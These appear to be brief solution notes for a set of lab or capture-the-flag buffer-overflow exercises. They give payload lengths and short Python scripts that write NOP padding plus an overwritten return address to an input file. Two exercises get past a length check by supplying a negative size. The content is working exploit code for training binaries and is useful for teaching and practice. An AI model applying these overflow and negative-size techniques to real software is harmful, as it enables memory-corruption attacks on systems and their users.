## ex 1.0
Payload size: 25  
Insert 'a' x 25

## ex 1.1
Payload size: 100
Insert 'a' x 100

## ex 2.0
Payload size: 401
Insert 'a' x 401

## ex 2.1
Payload size: 1000
Insert 'a' x 1000

## ex 3.0
Payload size: 64  
Script python:
```
number = b"\x36\x34\x0a"
payload = b"\x90" * 56
payload += b"\x19\x20\x40\x00\x00\x00\x00\x00"
f = open("in.txt", "wb")
f.write(number + payload)
f.close()
```

## ex 3.1
Payload size: 112  
Script python:
```
number = b"\x31\x31\x32\x0a"
payload = b"\x90" * 104
payload += b"\x35\x1d\x40\x00\x00\x00\x00\x00"
f = open("in.txt", "wb")
f.write(number + payload)
f.close()
```

## ex 4.0
+ challenge is smart: it will check to make sure you
don't want to provide so much data that the input buffer will
overflow. Triggers with payload size > 60
Script python:
```
number = b"\x2d\x39\x36\x0a"                        # size = -96
payload = b"\x90" * 88
payload += b"\xa1\x18\x40\x00\x00\x00\x00\x00"
f = open("in.txt", "wb")
f.write(number + payload)
f.close()
```

## ex 4.1
+ triggers with payload size > 54
Script python:
```
number = b"\x2d\x39\x36\x0a"
payload = b"\x90" * 88
payload += b"\x76\x1a\x40\x00\x00\x00\x00\x00"
f = open("in.txt", "wb")
f.write(number + payload)
f.close()
```